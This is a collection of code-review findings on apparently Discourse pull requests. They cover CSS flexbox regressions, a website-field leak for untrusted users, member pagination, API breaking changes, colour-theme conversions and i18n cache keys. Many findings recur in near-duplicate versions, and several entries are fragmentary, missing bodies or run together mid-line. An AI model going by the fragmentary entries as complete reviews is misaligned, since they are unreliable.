- **Buttons are direct children:** browsers ignore `float` on flex items, so `button { float: right; }` does nothing. The buttons render in source order, next to the avatar.
- **Buttons are inside `.small-action-desc`:** that element is now a flex item with the default `flex: 0 1 auto`. It shrinks to its content width instead of filling the row as the old block did (old padding-left was 4em). The right-floated buttons then sit right after the description text, not at the right edge of the post.

Either way, the edit/delete controls on small-action posts move visually. Fix by giving `.small-action-desc` `flex: 1` (and/or wrapping the buttons and pushing them right with `margin-left: auto`). The leftover `float` rules on `.topic-avatar` and `button` are dead code.

title: Panel right-alignment depends on `margin-left: auto`, which the legacy box model these prefixes target doesn't honor
body:
`float: right` was removed from `.d-header .panel`. Right-alignment now relies only on `margin-left: auto` inside the flex container.

The new `flexbox()` mixin deliberately emits the 2009 `display: -webkit-box` / `-moz-box` syntax for old browsers (old Android browser, older iOS Safari). In that box model, auto margins do not absorb free space. Those browsers will place the notification/user icons right after the logo and topic info instead of at the right edge of the header.

Either drop the legacy fallbacks so the support claim is honest, or add a legacy-compatible mechanism, e.g. a `-webkit-box-flex: 1` spacer or `-webkit-box-pack`.

title: `order` / `align-items` mixins pass modern values verbatim to legacy properties with different value spaces
body:
**`order($val)`:** `-webkit-box-ordinal-group` and `-moz-box-ordinal-group` only accept integers >= 1, and their default is 1. Standard `order` defaults to 0 and allows 0 and negatives. So `order(0)` or a negative value produces an invalid legacy declaration. `order(1)` reorders an element in modern browsers but leaves it unchanged in legacy ones.

**`align-items($alignment)`:** it forwards values to `-webkit-box-align` and `-ms-flex-align`, which use `start`/`end`, not `flex-start`/`flex-end`. `align-items(flex-start)` would emit invalid legacy declarations.

The current call sites (2, 3, `center`, `baseline`) happen to work. But these are generic shared mixins, and future callers will silently get inconsistent ordering or alignment. Map the values (e.g. ordinal-group = order + 1, flex-start → start) or document the restriction.

Separately, `-ms-align-items` (line 121) is not a real property.

title: `.extra-info-wrapper` as a flex item may not shrink for long topic titles
body:
Before, `.extra-info-wrapper` sat in normal flow between the floated `.title` and `.panel`, so it naturally took the remaining width. Now it is a flex item (`order: 2`) with default `flex: 0 1 auto` and `min-width: auto`.

A flex item's automatic minimum size is its min-content width. For a header topic title rendered with `white-space: nowrap` and `text-overflow: ellipsis`, that is the full title width, so the item will not shrink below it. Long titles can then overflow the header and push `.panel` (search/notification/user icons) off-screen.

Unless `overflow: hidden` is guaranteed on this element elsewhere, add `min-width: 0` (or `overflow: hidden`) and an explicit flex basis so truncation keeps working.

title: Small-action edit/delete buttons no longer reach the right edge
body:
`.small-action` is now a flex container, but `.small-action-desc` has no `flex-grow` (no `flex: 1`). It used to be a block that spanned the full row. Now it only takes its content width.

The edit/delete buttons inside it rely on `button { float: right; }` (line 309). They therefore float to the right edge of a narrow box, not the right edge of the post. For short actions such as "closed 2 days ago", the buttons end up right next to the text. With a long custom message they sit at the far right, so the position is inconsistent.

Any `button` that is a direct child of `.small-action` has its `float` ignored entirely, since floats don't apply to flex items.

Fix: add `flex: 1 1 auto` (and likely `min-width: 0`) to `.small-action-desc`.

title: order() passes the value unchanged to the 1-based legacy box-ordinal-group
body:
The 2009 box spec's `-webkit-box-ordinal-group` / `-moz-box-ordinal-group` only accept positive integers and default to 1. Modern `order` defaults to 0 and accepts 0 and negative values.

Passing `$val` straight through has two effects:
- `order(0)` or a negative value produces an invalid declaration in legacy engines, which is dropped.
- `order(1)` ties with un-ordered siblings in legacy engines but sorts after them in modern ones.

The current callers (2 and 3) happen to keep the same relative order. The mixin is now a shared helper, though, so the next caller can silently get different ordering per engine. Emit `$val + 1` for the legacy properties, as Bourbon/Compass do.

title: align-items() emits invalid legacy values for flex-start/flex-end and a non-existent property
body:
`-webkit-box-align` and IE10's `-ms-flex-align` expect `start`/`end`, not `flex-start`/`flex-end`. Calling `@include align-items(flex-start)` therefore produces invalid declarations for exactly the legacy engines the mixin exists to support.

Separately, `-ms-align-items` (line 121) is not a real property in any IE/Edge version and is dead output.

Only `center` and `baseline` are used today, so this is latent. Fix: map the values for the legacy prefixes and drop `-ms-align-items`.

title: Header right-alignment depends on modern-only flex behavior while float fallbacks were removed
body:
The `float: right` on `.panel` and `float: left` on `.title` were removed. Right-alignment of the panel now depends solely on `margin-left: auto` inside a flex container.

The new `flexbox()` mixin emits `display: -webkit-box` / `-moz-box` for old engines. In the 2009 box model, auto margins do not absorb free space (alignment is done with `box-pack`), and children's floats are ignored.

The result is that browsers matched only by the legacy prefixes render the panel immediately after the logo instead of at the right edge. The vendor prefixes therefore give a false sense of legacy support. Either drop the legacy `display` values or add the matching `-webkit-box-pack`/`-moz-box-pack` handling.

title: website_name bypasses the TL0 untrusted-attribute restriction
body:
For TL0 users viewed by anonymous visitors, `website` is deliberately hidden through `untrusted_attributes`, which checks `scope.restrict_user_fields?`. The new `website_name` attribute was added to the plain `attributes` list but not to `untrusted_attributes`, so it is always serialized. It contains the website host, and in the same-domain cases the full path too.

Before this change the client derived the name from `model.website`, which was absent for these users, so nothing was shown. Now `user.hbs` checks `{{#if model.website_name}}` and renders the name in a span for TL0 users.

As a result, new and untrusted (spam) accounts can again advertise their website to anonymous visitors, which is exactly what the restriction exists to prevent. Fix: add `:website_name` to `untrusted_attributes`, or make its include predicate also check `restrict_user_fields?`.

title: include_website_name lacks `?` suffix so it is never used as an include filter
body:
ActiveModel::Serializers looks for `include_<attr>?` predicates. This method is named `include_website_name` without the `?`, so the serializer never calls it. `website_name` is therefore always emitted (as `null` when there is no website), and any intended gating does not happen.

This is also why the method gives no protection for untrusted users. It should be renamed `include_website_name?`, and it should also apply the same `restrict_user_fields?` check that `website` uses.

title: Sibling-subdomain heuristic treats unrelated hosts under shared/public suffixes as same domain
body:
The `elsif` branch treats two hosts as the same site whenever everything after the first label matches and the instance host has more than two labels.

For instances hosted on shared domains this gives wrong results. For example, an instance at `forum.trydiscourse.com` (or `x.herokuapp.com`, `x.github.io`, `forum.co.uk`) will show the full URL path for any user website like `spam.trydiscourse.com/...` or `other.co.uk/...`. Those sites are not the instance's domain, so this contradicts the feature's intent.

The comparison is also case-sensitive: `URI#host` preserves case, so `http://Example.com/user` will not match `example.com`.

title: Tests don't cover website_name for TL0/anonymous or the sibling-subdomain branch
body:
The TL0 'untrusted attributes' list does not include `website_name`, and that profile has no website set, so the spec cannot catch that `website_name` leaks for restricted users.

The new `website_name` specs only exercise the identical-host, different-host and parent-domain cases. Nothing tests the `www.example.com` vs `forum.example.com` branch, a blank website, or a website without a path. The most complex conditional in the method is effectively untested.

title: website_name bypasses the TL0/anonymous restriction that hides website
body:
`website` is listed in `untrusted_attributes`, so it is stripped when an anonymous viewer looks at a TL0 user (`scope.restrict_user_fields?`). This anti-spam measure keeps new users' links out of public profiles. The new `website_name` attribute is derived from the same value but is not in that list, so it is always serialized and reveals the host, and sometimes the full path, of the TL0 user's website.

The template now renders `model.website_name`, so the website text appears on the profile even though `website` was withheld. Add `:website_name` to `untrusted_attributes`, and add it to the TL0 spec's `untrusted_attributes` list, which currently does not catch this.

title: include_website_name is missing the `?` suffix and is never called
body:
ActiveModel::Serializers looks for `include_<attr>?` predicates. `def include_website_name` has no `?`, so the serializer never invokes it. It is dead code: `website_name` is always emitted, as `null` when there is no website.

Even renamed to `include_website_name?`, checking only `website.present?` would still skip the `restrict_user_fields?` check. The correct fix is to cover `website_name` via `untrusted_attributes` and drop this method.

title: Sibling-subdomain heuristic treats unrelated domains under public suffixes as the same site
body:
When both hosts have the same number of labels (more than 2), the code drops the first label and compares the rest. For instance hosts like `forum.co.uk` or `forum.github.io`, any website such as `evil.co.uk` or `someone.github.io` matches. Those unrelated sites then have their full path shown as if they belonged to the forum's own domain. The comparison is also case-sensitive: `URI#host` keeps the user's casing while `current_hostname` is lowercase, so `http://Example.com/...` won't match.

This branch has no spec coverage; the three new tests only exercise the equal-host branch and the parent-domain branch.

title: website_name bypasses untrusted_attributes, exposing TL0 users' websites to anonymous viewers
body:
`website` is listed in `untrusted_attributes`, so it is omitted when `scope.restrict_user_fields?(object)` is true (a TL0 user viewed by an anonymous visitor). This anti-spam control exists to keep new users' links off public pages.

The new `website_name` attribute carries the website's host and often its full path, but it is not added to `untrusted_attributes` and has no equivalent guard. It is therefore always serialized.

Before this change, the client derived the display name from `model.website`, which was absent in this case, so nothing was shown. Now `user.hbs` checks `model.website_name` and renders it (as a span, because `linkWebsite` is false for TL0). Spam profiles' domains are again shown to anonymous users and crawlers.

Fix: add `:website_name` to `untrusted_attributes`, or have its include method return false when `scope.restrict_user_fields?(object)`.

title: include_website_name is missing the trailing `?` and is never called
body:
ActiveModel::Serializers looks for `include_<attr>?` to decide whether to emit an attribute. The method here is named `include_website_name`, without the `?`, so the serializer never calls it.

As a result `website_name` is always emitted, as `nil` when no website is set. The intended conditional inclusion never takes effect.

This also suggests the author expected this method to gate the attribute; it does not, which contributes to the untrusted-attribute leak above. It should be renamed `include_website_name?` and should also respect `restrict_user_fields?`.

title: Sibling-subdomain heuristic treats unrelated domains under a shared public suffix as the same site
body:
When both hosts have the same number of labels and more than two, the code drops the first label of each and compares the rest. It ignores public suffixes.

For example, with the forum at `forum.co.uk`, a user website `evil.co.uk/whatever` matches on `co.uk`. Likewise `alice.github.io` vs `forum.github.io` matches on `github.io`.

In these cases unrelated third-party sites are shown with their full path, which is the opposite of what the feature intends. The comparison is also case-sensitive, so `Example.com` would not match `example.com`.

title: Untrusted-attributes spec not updated for website_name; sibling-subdomain branch untested
body:
The TL0/anonymous spec checks a fixed list of untrusted attributes, and `website_name` was not added to it. As a result the leak of the website host/path for TL0 users goes undetected.

Separately, the new specs only cover the exact-match, unrelated-domain and parent-domain cases. The `www.example.com` vs `forum.example.com` sibling-subdomain branch on line 146 has no test, nor does the case where the URL cannot be parsed or has no host.

title: Light-theme username color in embedded posts changed from 30% to 70% lightness
body: In `.embedded-posts .topic-meta-data h5 a`, the original rule was `scale-color($primary, $lightness: 30%)`. The light-theme branch, which should keep the original value, now uses 70% instead of 30%. On the default light theme, the bold username in expanded and in-reply-to posts turns from a dark gray into a pale gray with much lower contrast. The dark branch is also off: it should mirror the original as `$secondary` 70%, not 30%. The rule should be `dark-light-choose(scale-color($primary, $lightness: 30%), scale-color($secondary, $lightness: 70%))`.

title: Light/dark lightness values swapped for .custom-message-length

Both percentages are inverted. On light themes the flag-message character counter becomes much darker than before. On dark themes it is far brighter than the desktop equivalent in `desktop/modal.scss`, which correctly uses 70%/30%. It should be `dark-light-choose(scale-color($primary, $lightness: 70%), scale-color($secondary, $lightness: 30%))`.

title: Light-theme color of .group-member-info .name changed from 30% to 50%

To preserve the light theme and mirror it for dark, use `dark-light-choose(scale-color($primary, $lightness: 30%), scale-color($secondary, $lightness: 70%))`.

title: Light-theme color of mobile .group-member-info .name changed from 30% to 50%

On mobile light themes the member name gets lighter and becomes indistinguishable from the title, which is also 50%. title: Mobile topic-map h3 light-theme color changed from 20% to 50%
body: The original `.topic-map h3` color was `scale-color($primary, $lightness: 20%)`. title: Missed conversion: category badge-notification still uses scale-color($primary)

It should use `dark-light-choose(scale-color($primary, $lightness: 50%), scale-color($secondary, $lightness: 50%))` like the other rules in this file.

title: Light-theme color changed from 30% to 70% for embedded post author links
body:
The original rule was `scale-color($primary, $lightness: 30%)`. It was rewritten as `dark-light-choose(scale-color($primary, $lightness: 70%), scale-color($secondary, $lightness: 30%))`.

The first argument of `dark-light-choose` is the light-theme value, so this is no longer a dark-theme-only change. On every default (light) site, the bold username links in `.embedded-posts .topic-meta-data h5 a` now become much lighter and lower-contrast.

Every other conversion in this PR keeps the light value and uses the complement for the dark value. This one should be `dark-light-choose(scale-color($primary, $lightness: 30%), scale-color($secondary, $lightness: 70%))`.

title: Light-theme color of group member name changed from 30% to 50%
body:

This changes the default light-theme appearance, making the headers noticeably lighter, which a dark-theme-only fix should not do. The desktop equivalent was correctly converted to 20%/80%. title: group-member-info .name light-theme lightness changed from 30% to 50%

title: Mobile group-member-info .name light-theme lightness changed from 30% to 50%
body: This is the same issue as on desktop. The original `scale-color($primary, $lightness: 30%)` became 50%/50%, which alters the default light-theme color and makes the member name look the same as the title. title: Remaining unconverted scale-color($primary) in categories badge-notification
body: `.topic-list.categories .category .badge-notification { color: scale-color($primary, $lightness: 50%); }` was not converted, unlike every other occurrence in this file. On dark themes `$primary` is light, so lightening it 50% gives a nearly white value. The category topic counts will therefore not match the surrounding converted text, which is the problem this PR is meant to fix. It should use `dark-light-choose(scale-color($primary, $lightness: 50%), scale-color($secondary, $lightness: 50%))`.

title: totalPages off-by-one adds an empty page when user_count is a multiple of limit
body:
`totalPages` is computed as `Math.floor(user_count / limit) + 1`. With 50 members and a limit of 50 it reports 2 pages, and with 100 members it reports 3.

The Next button stays enabled. Clicking it sets offset to `user_count`, and the server returns an empty member list, so the admin sees a blank last page (e.g. "2/2" with no members).

The same happens after removing the only member on the last page: `findMembers` reloads with the old offset, the page comes back empty, and it still counts as a valid page.

Use `Math.ceil(user_count / limit)` instead. Also clamp `offset` to the last real page after a removal.

title: Public group members page now shows only the first 50 members with no way to page
body:
The public `/groups/:name/members` page now calls `model.findMembers()`, which uses the model default `limit: 50, offset: 0`. The `group/members.hbs` template only iterates `members` and has no next/previous controls.

Previously non-automatic groups returned all members and automatic groups returned 200. Now any group with more than 50 members is silently truncated to 50 on the public page, and users cannot reach the rest.

Either add pagination or infinite loading to the public template, or keep requesting enough members there.

title: remove_member uses users.delete which bypasses GroupUser destroy callbacks
body:
`group.users.delete(user_id)` on a `has_many :through` deletes the `group_users` join rows with a SQL `delete_all`. It does not destroy them, so GroupUser `after_destroy` callbacks (title/primary-group cleanup) never run. The `user_count` counter cache may also not be maintained, and this PR now displays that count and uses it for pagination.

The previous code path used `group.remove(user)`, which destroys each GroupUser and runs those callbacks. Removed users can therefore keep stale group-derived state (title, primary group), and `user_count` can drift.

Look up the user and call `group.remove(user)` instead. The trailing `group.save` is also unnecessary.

title: Removing nested group params and PATCH changes API silently breaks existing clients (and hides groups)
body:
The admin groups API changed incompatibly:
- `create` now reads `params[:name]` instead of `params[:group][:name]`.
- `update` reads top-level params instead of `params[:group]`.
- The PATCH `changes: {add:, delete:}` incremental membership API is gone.

Existing API integrations (e.g. SSO/sync scripts) get a bad failure mode. A PUT with `group[...]`, or a PATCH with `changes`, now hits `update`, where `params[:visible]` is absent. So `group.visible = params[:visible] == "true"` sets the group to invisible, the request returns success, and no membership change happens. Creates with nested params fail with an empty name.

Consider keeping backward compatibility, or at least not resetting `visible` when the param is absent.

title: Public members endpoint accepts unbounded limit and negative offset
body:
`limit = (params[:limit] || 50).to_i` and `offset = params[:offset].to_i` are passed straight to SQL without validation, on an endpoint any visitor can call for visible groups.

- A huge `limit` (e.g. 1000000 on the trust_level_0 automatic group) serializes the whole user base in one request.
- A negative limit or offset makes PostgreSQL raise ("OFFSET must not be negative"), which surfaces as a 500.

Clamp `limit` to a sane maximum and offset/limit to be non-negative.

title: members.json response shape changed from array to object without updating/adding specs
body:
`GET /groups/:name/members.json` used to return a JSON array of users. It now returns `{members: [...], meta: {total, limit, offset}}`, which breaks any external consumer of this public endpoint.

No spec covers the new response shape or the pagination behaviour (limit/offset/total), so regressions in the meta values the admin pager depends on would go unnoticed.

title: remove_member spec uses PUT although the route is DELETE
body:
The test "cannot remove members from automatic groups" issues `xhr :put, :remove_member`, but the route is `delete "members" => "groups#remove_member"`.

Controller specs dispatch straight to the action and don't enforce the HTTP verb, so the test passes while not exercising the real request. Use `xhr :delete` to match the route and the other remove_member test.

title: Legacy PATCH/nested-PUT clients now silently hide the group and get a success response
body:
The PATCH path (`changes: {add:, delete:}`) and the nested `group: {...}` payload were removed, but `resources :groups` still routes PATCH and PUT to `update`.

An existing API client that sends `PATCH /admin/groups/:id` with `changes[add]=bob` now reaches `update`, where:
- `params[:visible]` is nil, so `group.visible = params[:visible] == "true"` sets the group to invisible;
- no members are added;
- the response is `success_json`.

A PUT with the old nested `group[usernames]` / `group[visible]` format behaves the same way.

Integrations such as SSO/group-sync scripts would believe the membership change succeeded while the group was actually hidden. Either keep backward compatibility or reject unknown or legacy payloads explicitly, and only assign `visible` when the param is present.

title: remove_member bypasses Group#remove and GroupUser destroy callbacks
body:
`group.users.delete(user_id)` on a `has_many :through` association deletes the `group_users` join rows with `delete_all`. No `GroupUser` callbacks run, and the model's own `Group#remove(user)` logic is skipped; the previous incremental-delete code called `group.remove(user)`.

This is also asymmetric with `add_members`, which uses `group.add(user)`. Any cleanup tied to membership removal (destroy callbacks, primary-group or title cleanup, counters) will not happen.

If `user_id` is not a member, `find` raises `RecordNotFound` instead of returning a clear error. Look up the user and call `group.remove(user)` instead.

title: Adding a user who is already a member raises; partial adds and silent UI failure
body:
`group.add(user)` does `users.push(user)` with no membership check. For an existing member this violates the unique `group_users(group_id, user_id)` constraint (or validation) and raises, producing a 500. Users earlier in the comma list stay added because there is no transaction.

This is now the main admin UI path, and the UI makes it easy to hit:
- `addMembers` in admin-group.js.es6 does not clear the input after a successful add (TODO noted), so clicking Add twice re-submits the same usernames.
- `Group#addMembers` has no rejection handler, so the admin sees nothing.

Skip users who are already members, e.g. `group.add(user) unless group.users.include?(user)`, and surface errors in the client.

title: totalPages off by one when user_count is a multiple of limit
body:
`totalPages` is computed as `Math.floor(user_count / limit) + 1`. With exactly 50 members and a limit of 50 it reports 2 pages.

On page 1, `showingLast` is false, so the "next" control is enabled. Clicking it sets offset to 50, fetches an empty member list, and shows "2/2" with no members. The same happens for 100, 150, and so on.

Use `Math.ceil(user_count / limit)`.

title: Public group members page now truncates at 50 members with no way to page
body:
`members` now defaults to `limit = 50` for every group; previously non-automatic groups returned all members. The public `group-members` route calls `model.findMembers()` with the default limit and offset 0.

`templates/group/members.hbs` has no next/previous controls, so any group with more than 50 members shows only the first 50 on its public page, and the rest cannot be reached. Add pagination or infinite loading to the public page, or keep the old behaviour there.

title: Breaking change in /groups/:id/members.json response shape
body:
The endpoint used to return a bare JSON array of users. It now returns `{members: [...], meta: {total, limit, offset}}` and is paginated by default.

Any external consumer of this public endpoint will break: iterating the response, or expecting the full member list for non-automatic groups. Other client code that calls `findMembers()` expecting a promise of an array will also break, because the method now resolves to undefined and only mutates the model.

This should be called out or versioned, and any remaining callers audited.

title: limit/offset not validated or clamped
body:
`limit` and `offset` come straight from `to_i`.
- A negative value makes PostgreSQL raise ("LIMIT/OFFSET must not be negative"), giving a 500.
- `limit=0` is echoed back in `meta.limit`, and the admin controller then divides by it in `currentPage`/`totalPages`, producing NaN/Infinity.
- Arbitrarily large limits are accepted on this publicly reachable endpoint.

Clamp `limit` to a sane range, e.g. 1..200, and `offset` to >= 0.

title: create ignores alias_level sent by the client
body: The new flattened `asJSON` sends `alias_level` on POST, and the form exposes the alias-level combo box before the group exists. `create` only assigns `name` and `visible`, so the alias level chosen when creating a group is silently dropped until the admin saves again.

title: remove_member automatic-group spec uses the wrong HTTP verb and relies on seeded id 1
body:
The "cannot remove members from automatic groups" example issues `xhr :put, :remove_member`, but the route is `delete "members"`. Controller specs do not enforce the verb, so the test passes without exercising the real request.

Several examples (`add_members`, `remove_member`, `update`) also assume `Group.find(1)` exists and is automatic, which depends on seed data. Fabricate an automatic group explicitly and use `:delete`.

title: No coverage for the new paginated members endpoint or normal-group update
body:
`GroupsController#members` changed its response format and added limit/offset pagination, but no spec covers the new `members`/`meta` structure or the pagination behaviour.

The `.update` context only tests that a rename is ignored on an automatic group. Renaming a normal group and changing `alias_level` are untested, as is the removal of the PATCH path (no test asserts how legacy PATCH requests are handled).

title: remove_member uses group.users.delete, skipping GroupUser destroy callbacks
body:
`group.users.delete(user_id)` on a has_many :through deletes the GroupUser join row with a raw `delete_all`, so GroupUser `after_destroy` callbacks do not run. In Discourse those callbacks (`remove_primary_group`, `remove_title`) clear the user's `primary_group_id` and group-derived title. After removal through this endpoint, the user can still have the removed group as their primary group and keep its title, leaving stale data.

The previous code called `group.remove(user)`, which destroys the GroupUser records and fires the callbacks. Use that here instead. The trailing `group.save` also does nothing, because the delete has already been persisted.

title: Adding a username that is already a member raises and 500s, leaving a partial add
body:
`group.add(user)` is `users.push(user)`, which immediately inserts a GroupUser row, and nothing checks for existing membership first. If the admin enters a username that is already in the group, the unique (group_id, user_id) constraint raises `RecordNotUnique` and the request returns a 500.

Usernames processed before the duplicate have already been committed, so the add is partial. On the client, `Group#addMembers` has no error handler, so the admin gets no feedback and the list is not refreshed.

The old UI sent the full usernames list through `usernames=`, which diffed membership, so this case did not arise. Skip users who are already members, e.g. `group.add(user) unless group.users.include?(user)`.

title: totalPages off by one when user_count is a multiple of limit
body: `totalPages` is computed as `Math.floor(user_count / limit) + 1`. When `user_count` is an exact multiple of `limit` (e.g. 50 members with limit 50), this gives 2 instead of 1. The pager then shows "1/2" with Next enabled. Clicking Next sets offset to 50 (`Math.min(offset + limit, user_count)`), the server returns an empty page, and the admin sees "2/2" with no members. Use `Math.ceil(user_count / limit)`.

title: Removed PATCH/nested-param API now silently resets visibility for existing callers
body:
The incremental `PATCH /admin/groups/:id` with `changes: {add:, delete:}` and the nested `group: {...}` params for PUT and POST have been removed, but the routes still accept these requests.

A PATCH from an existing API client now reaches `update`, which does no membership change. Because `params[:visible]` is absent, `group.visible = params[:visible] == "true"` sets the group to invisible and returns success. Clients still sending `group[visible]`/`group[name]` to PUT get the same silent visibility reset.

POST `/admin/groups` with `group[name]` now creates nothing and returns a validation error, because `params[:name]` is nil.

Either keep backward compatibility for these callers, or only assign `visible` when the parameter is present.

title: Public group members page now shows only the first 50 members with no pagination
body: `GroupsController#members` now always applies `limit` (default 50), and `findMembers` requests only the first page. The public `group/members.hbs` template iterates `members` but has no next/previous controls, unlike the admin template. Previously non-automatic groups returned all members. Any group with more than 50 members now silently shows a truncated list on the public group page, and users have no way to see the rest.

title: Public /groups/:name/members.json response shape changed from array to object
body: The endpoint previously returned a JSON array of users. It now returns `{members: [...], meta: {...}}`. Any external API consumer, or other client code still treating the response as an array, will break. No spec was added or updated in `spec/controllers/groups_controller_spec.rb` to cover the new shape or the pagination meta.

title: members limit/offset are unvalidated (no cap, negatives cause 500)
body: `limit` and `offset` are taken directly from params. Anyone who can see a group can pass a very large `limit` (e.g. on trust_level_0 or everyone-sized groups) and force serialization of every member in one request. A negative `limit` or `offset` makes PostgreSQL raise and the request returns a 500. A `limit` of 0 is echoed back in `meta.limit` and causes a division by zero in the client pager. Clamp `limit` to a sane range (e.g. 1..200) and `offset` to at least 0.

title: remove_member spec uses PUT although the route is DELETE
body: The test "cannot remove members from automatic groups" issues `xhr :put, :remove_member`, but `config/routes.rb` maps `remove_member` only to `DELETE members`. Controller specs dispatch straight to the action without checking the HTTP verb, so the test passes while exercising a request shape the app never routes. Use `:delete` to match the real route.

title: addMembers/removeMember have no failure handling
body: Both `addMembers` and `removeMember` only chain a success callback. The controller actions only chain onto these promises (for `addMembers` the promise is not even returned). When the server responds with an error, the UI shows nothing to the admin: for example, the 422 for automatic groups, or a 500 on duplicate member insert. The failure is silent and the admin cannot tell whether the change was applied. The input is also never cleared after a successful add, as the TODO acknowledges.

title: Fallback chain depends on per-site default_locale but the translation LRU cache ignores it
body:
`FallbackLocaleList#[]` builds the fallback chain from `SiteSetting.default_locale`, which differs per site in multisite and can be changed by an admin at runtime. The process-wide LRU cache in `I18n.translate` (translate_accelerator.rb, `k = "#{key}#{config.locale}#{config.backend.object_id}"`) is keyed only by key, requested locale and backend.

Scenario: a user on site A (default `de`) requests a key that is missing in `ja`. The `de` fallback string is cached. A `ja` user on site B (default `fr`) in the same process then gets site A's German text. The same staleness happens after an admin changes `default_locale`: earlier fallback results stay cached until the process restarts.

Fix: include the resolved fallback chain (or the site default locale) in the cache key, or skip caching results that came from a fallback.

title: Fallback locales are only loaded in ApplicationController, so other contexts miss fallbacks and can poison the cache
body:
The patched loader only loads translation files on demand. `I18n.translate` loads `config.locale` only, and the fallback locales (site default and `:en`) are loaded only by `I18n.fallbacks.ensure_loaded!` in `ApplicationController#set_locale`. These paths never call it:
- Sidekiq jobs and mailers
- rake tasks
- controllers or middleware outside ApplicationController
- `I18n.t(..., locale: x)` calls

In those paths a key missing from the current locale falls back to locales whose translations were never loaded, so the lookup returns "translation missing: ...". For argument-less `I18n.t` calls that string is frozen into the shared LRU cache under `key+locale`. Later web requests get the cached "translation missing" text even after `ensure_loaded!` has loaded `en`.

Fix: load the fallback chain inside the patched `I18n.translate` / `load_locale`, not in a controller filter.

title: No specs for the new fallback behavior
Fallback result depends on per-site default_locale, but the process-wide translation cache key ignores it
body:
`FallbackLocaleList#[]` makes the result of a lookup depend on `SiteSetting.default_locale`. That value differs per site in multisite and can be changed at runtime.

The LRU cache in `lib/freedom_patches/translate_accelerator.rb` is process-global. Its key is `"#{key}#{config.locale}#{config.backend.object_id}"`, which does not include the site's default locale or the fallback chain.

Example: a key missing in `fr` is first resolved on a site whose default is `de`. The German string is cached under the `fr` key. It is then returned to `fr` users on every other site in the same process, including a site whose default is `es`. Changing `default_locale` on a single site also leaves stale fallback strings in the cache.

Fix: include the fallback chain (or `SiteSetting.default_locale`) in the cache key, or clear the cache when it changes.

title: Fallback locales are only loaded in the controller before_filter, so fallbacks fail outside web requests
body:
The lazy-loading patch's `I18n.translate` only calls `load_locale(config.locale)`. The fallback locales (site default and `:en`) are loaded only by `I18n.fallbacks.ensure_loaded!`, and that is called only from `ApplicationController#set_locale`.

That call is skipped in several places:
- Sidekiq jobs and mailers that switch `I18n.locale` to a user's locale.
- Rake tasks and middleware.
- Controllers that skip `set_locale`.
- Calls that pass an explicit `locale:` option.

In all of these, the fallback locales may not be loaded in that process. A key missing in the user's locale then produces a 'translation missing' string instead of the site-default or English text. For argument-less lookups, that missing-translation result is also frozen into the LRU cache.

Fallback loading belongs in `translate`/`load_locale` itself, e.g. by loading every locale in `I18n.fallbacks[locale]`.

title: No specs for the new fallback chain or ensure_loaded!
Translation cache key ignores the site-dependent fallback chain
body:
The LRU cache key is built only from key, `config.locale` and the backend object_id. With the new Fallbacks module, the value returned for a locale also depends on `SiteSetting.default_locale`, which `FallbackLocaleList#[]` reads on every lookup. That setting differs per site in multisite and can be changed by an admin at runtime.
